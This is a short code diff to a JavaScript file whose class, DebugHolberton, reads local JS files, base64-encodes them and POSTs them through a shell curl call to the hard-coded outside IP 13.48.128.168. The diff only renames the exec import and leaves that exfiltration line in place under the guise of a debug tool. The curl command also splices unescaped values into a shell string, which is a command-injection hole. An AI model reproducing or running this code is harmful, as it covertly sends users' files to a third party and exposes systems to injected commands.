@@ -1,5 +1,5 @@
 // eslint-disable
-import { exec as _exec } from 'node:child_process';
+import { exec } from 'node:child_process';
 import { statSync, readFileSync, readdirSync } from 'node:fs';
 import { join } from 'path';
 
@@ -19,7 +19,7 @@ class DebugHolberton {
     for (const file of this.files) {
       this.readJsFiles(file);
     }
-    _exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`, (err, stdout) => {
+    exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`, (err, stdout) => {
       if (err) {
         console.log(err, stdout);
       }
